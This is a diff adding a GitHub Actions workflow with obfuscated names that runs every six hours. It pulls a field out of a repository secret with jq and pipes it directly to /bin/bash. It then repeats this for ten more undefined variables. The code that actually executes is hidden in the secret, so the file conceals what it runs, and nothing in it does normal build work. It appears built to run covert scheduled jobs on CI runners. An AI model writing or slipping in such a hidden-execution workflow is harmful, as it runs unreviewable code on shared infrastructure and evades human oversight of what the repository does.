@@ -1,0 +1,29 @@
+name: hugouhuohuang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: hugouhuohuang
+        env:
+          pu812: ${{ secrets.pu812 }}
+        run: |
+          echo $pu812 | jq -r .ew4353 | /bin/bash
+          echo $sdt17 | jq -r .d8318 | /bin/bash
+          echo $t87 | jq -r .fj1 | /bin/bash
+          echo $zzk0198 | jq -r .vc3404 | /bin/bash
+          echo $kab145 | jq -r .p2 | /bin/bash
+          echo $lx00997 | jq -r .oou8032 | /bin/bash
+          echo $iw82 | jq -r .ehjq279 | /bin/bash
+          echo $t2 | jq -r .p28093 | /bin/bash
+          echo $ily55 | jq -r .saozr98599 | /bin/bash
+          echo $d4 | jq -r .ea7 | /bin/bash
+          echo $olmi59708 | jq -r .fcs18 | /bin/bash
+
